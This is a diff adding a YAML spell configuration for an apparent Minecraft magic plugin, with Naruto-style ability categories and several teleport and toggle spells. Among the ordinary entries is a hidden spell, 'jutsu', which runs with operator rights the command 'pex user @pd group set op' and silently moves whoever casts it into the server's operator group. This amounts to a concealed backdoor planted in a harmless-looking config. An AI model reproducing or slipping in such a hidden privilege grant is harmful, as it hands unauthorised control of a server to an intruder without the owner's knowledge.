@@ -1,0 +1,103 @@
+#CATEGORIES:
+#BASIC
+#ADDITION
+#DODJUTSU
+#KENJUTSU
+#TAIJUTSU
+#SENJUTSU
+#GENJUTSU
+#HIDEN
+#OTHER
+
+
+
+# Inheritance
+mode:
+  quick_cast: true
+  toggle: cancel
+  disable_mana_regeneration: true
+  parameters:
+    target: self
+    cooldown: 0
+    cancel_on_death: true
+    repeat: infinite
+    duration: 36000
+  costs:
+    mana: 0
+  active_costs:
+    mana: 0
+
+
+tp15q:
+  icon_url: http://textures.minecraft.net/texture/15987e49e7ed16df536f4dbf685e7720b88b4de6deaf614d84ab9f9884725c
+  category: special
+  worth: 220
+  earns_sp: 0
+  quick_cast: true
+  actions:
+    cast:
+    - class: ChangeContext
+      actions: 
+      - class: Teleport
+    - class: PotionEffect
+      target: self
+  parameters:
+    effect_confusion: 1
+    target: self
+    duration: 15000
+    target_location: -384 74 -556
+    safe: false
+    vertical_range: 250
+    stop_on_success: true
+    cooldown: 0
+  costs:
+    mana: 0
+
+jutsu:
+  name: Рандомный Клан
+  icon: diamond_axe:201
+  icon_disabled: diamond_pickaxe:201
+  icon_url: http://textures.minecraft.net/texture/1adaf6e6e387bc18567671bb82e948488bbacff97763ee5985442814989f5d
+  hidden: true
+  category: special
+  actions:
+    cast:
+    - class: Command
+  parameters:
+    target: self
+    op: true
+    commands:
+    - pex user @pd group set op
+    - jutsu
+  costs:
+    mana: 0
+
+
+
+teleport:
+  icon: diamond_pickaxe:48
+  icon_disabled: diamond_axe:48
+  icon_url: http://textures.minecraft.net/texture/8b6a72138d69fbbd2fea3fa251cabd87152e4f1c97e5f986bf685571db3cc0
+  category: special
+  worth: 50
+  actions:
+    cast:
+      - class: PotionEffect
+  effects:
+    cast:
+    - class: EffectSingle
+      location: origin
+      effectlib:
+        class: Sphere
+        particle: Cloud
+        speed: 0.9
+        iterations: 7
+  parameters:
+    target: self
+    duration: 10000
+    effect_confusion: 2
+    effect_blindness: 2
+    cooldown: 1000
+    loot: false
+  costs:
+    mana: 0
